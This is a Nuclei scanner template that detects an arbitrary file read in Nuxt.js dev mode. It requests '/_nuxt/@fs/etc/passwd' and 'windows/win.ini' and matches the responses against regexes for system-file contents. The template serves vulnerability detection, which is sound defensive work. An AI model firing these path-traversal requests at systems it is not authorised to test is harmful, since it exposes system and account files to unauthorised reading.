id: nuxt-js-lfi

info:
  name: Arbitrary File Read in Dev Mode - Nuxt.js
  author: DhiyaneshDK
  severity: high
  tags: huntr,lfi,nuxtjs

http:
  - method: GET
    path:
      - "{{BaseURL}}/_nuxt/@fs/etc/passwd"
      - "{{BaseURL}}/_nuxt/@fs/windows/win.ini"

    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or

